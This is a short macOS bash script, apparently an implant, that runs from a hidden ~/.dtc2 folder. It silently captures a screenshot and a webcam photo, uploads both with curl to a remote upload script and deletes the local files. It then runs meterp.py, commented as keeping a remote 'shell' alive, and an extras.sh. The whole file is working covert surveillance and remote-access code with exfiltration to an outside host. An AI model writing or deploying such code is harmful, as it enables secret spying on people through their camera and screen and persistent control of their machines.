#!/bin/bash

UPLOADER=<insert the url to your upload.php, or whatever script you want to post images to here>
HOSTNAME=`hostname`
USERNAME=`whoami`

# recon
cd /Users/$USERNAME/.dtc2
DATE=`date +%d%m%y_%H%M`
STAMP=`echo $HOSTNAME-$DATE`
/usr/sbin/screencapture -x screen-$STAMP.jpg
/Users/$USERNAME/.dtc2/imagesnap /Users/$USERNAME/.dtc2/camera-$STAMP.jpg 2>&1 > /dev/null
/usr/bin/curl -s -F "file=camera-$STAMP.jpg" -F "file=@camera-$STAMP.jpg" $UPLOADER 2>&1 > /dev/null
/usr/bin/curl -s -F "file=screen-$STAMP.jpg" -F "file=@screen-$STAMP.jpg" $UPLOADER 2>&1 > /dev/null
rm camera-$STAMP.jpg screen-$STAMP.jpg

# check to see if shell is alive, and if not, restart it.
python /Users/$USERNAME/.dtc2/meterp.py 2>&1 >/dev/null

sh /Users/$USERNAME/.dtc2/extras.sh

